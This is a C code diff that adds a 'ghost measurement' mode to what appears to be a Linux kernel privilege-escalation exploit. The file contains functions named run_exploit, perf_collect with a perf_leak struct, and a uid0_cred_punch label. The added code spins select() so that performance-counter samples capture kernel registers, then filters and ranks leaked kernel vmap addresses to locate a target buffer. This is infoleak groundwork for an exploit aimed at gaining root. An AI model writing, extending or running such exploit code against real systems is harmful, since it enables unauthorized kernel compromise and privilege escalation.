@@ -1733,6 +1733,18 @@ static int perf_collect(int pid, struct perf_leak *out) {
       struct timespec ts = {0, 2000000L};
       nanosleep(&ts, NULL);
     }
+  } else if (env_flag("PERFDUMP_SEL", 0)) {
+    /* GHOST MEASUREMENT: spin select() instead of getpid — PMU samples
+     * land in the select path (copy_from_user holds the kernel fdset
+     * buffer address in registers) = the ghost's own neighborhood. The
+     * buffer address IS the ghost (waiter word0 = buffer start). */
+    fd_set mi, mo, me;
+    struct timeval mtv = {0, 0};
+    for (int i = 0; i < 4000; i++) {
+      FD_ZERO(&mi); FD_ZERO(&mo); FD_ZERO(&me);
+      FD_SET(0, &mi);
+      select(PSELECT_ROUTE_NFDS, &mi, &mo, &me, &mtv);
+    }
   } else {
     for (volatile int i = 0; i < 800000; i++)
       syscall(__NR_getpid);
@@ -1753,6 +1765,9 @@ static int perf_collect(int pid, struct perf_leak *out) {
   int n_hi = 0, n_samp = 0, n_ip_log = 0;
   uint64_t vm_page[16], vm_top[16];
   int vm_pn[16];
+  uint64_t gv_val[200];
+  int gv_cnt[200];
+  int gv_n = 0;
   memset(vm_page, 0, sizeof(vm_page));
   memset(vm_pn, 0, sizeof(vm_pn));
   memset(vm_top, 0, sizeof(vm_top));
@@ -1789,6 +1804,20 @@ static int perf_collect(int pid, struct perf_leak *out) {
         for (int ri = 0; ri < 33; ri++) {
           uint64_t v = regs[ri];
           if (v >= 0xffffffc000000000ULL && v < 0xfffffffe00000000ULL) {
+            if (gv_n < 200) {
+              int gf = -1;
+              for (int gu = 0; gu < gv_n; gu++)
+                if (gv_val[gu] == v) {
+                  gf = gu;
+                  break;
+                }
+              if (gf < 0) {
+                gv_val[gv_n] = v;
+                gv_cnt[gv_n] = 0;
+                gf = gv_n++;
+              }
+              gv_cnt[gf]++;
+            }
             uint64_t pg = v & ~0xfffull;
             int fi = -1;
             for (int u = 0; u < 16; u++) {
@@ -1837,6 +1866,27 @@ static int perf_collect(int pid, struct perf_leak *out) {
       pr_info("waiter stack cluster: page=%llx top=%llx n=%d\n",
               (unsigned long long)vm_page[best],
               (unsigned long long)vm_top[best], vm_pn[best]);
+    }
+    /* GHOST MEASURE: dump EVERY vmap cluster page (page, top, count) so
+     * ghost candidates come from data — the fdset buffer address is among
+     * the select-path samples when PERFDUMP_SEL armed the spin. */
+    if (env_flag("PERFDUMP_SEL", 0)) {
+      for (int u = 0; u < 16; u++)
+        if (vm_page[u])
+          pr_info("GMEAS page=%llx top=%llx n=%d\n",
+                  (unsigned long long)vm_page[u],
+                  (unsigned long long)vm_top[u], vm_pn[u]);
+      for (int rank = 0; rank < 24 && rank < gv_n; rank++) {
+        int gb = -1;
+        for (int gu = 0; gu < gv_n; gu++)
+          if (gv_cnt[gu] > 0 && (gb < 0 || gv_cnt[gu] > gv_cnt[gb]))
+            gb = gu;
+        if (gb < 0)
+          break;
+        pr_info("GVAL[%02d] %016llx x%d\n", rank,
+                (unsigned long long)gv_val[gb], gv_cnt[gb]);
+        gv_cnt[gb] = 0;
+      }
     }
   }
   hdr->data_tail = head;
@@ -3429,6 +3479,15 @@ uid0_cred_punch:;
 
 #define SYS_getdents64 217
 #define SYS_gettid 178
+
+/* Waiter-side ghost measurement entry (called from the fops spin block):
+ * runs the select-spin self-sample under PERFDUMP_SEL and prints the
+ * GMEAS/GVAL histograms. */
+void waiter_ghost_measure(void) {
+  struct perf_leak ml;
+  memset(&ml, 0, sizeof(ml));
+  perf_collect(0, &ml);
+}
 
 int run_exploit(int argc, char **argv) {
   (void)argc; (void)argv;
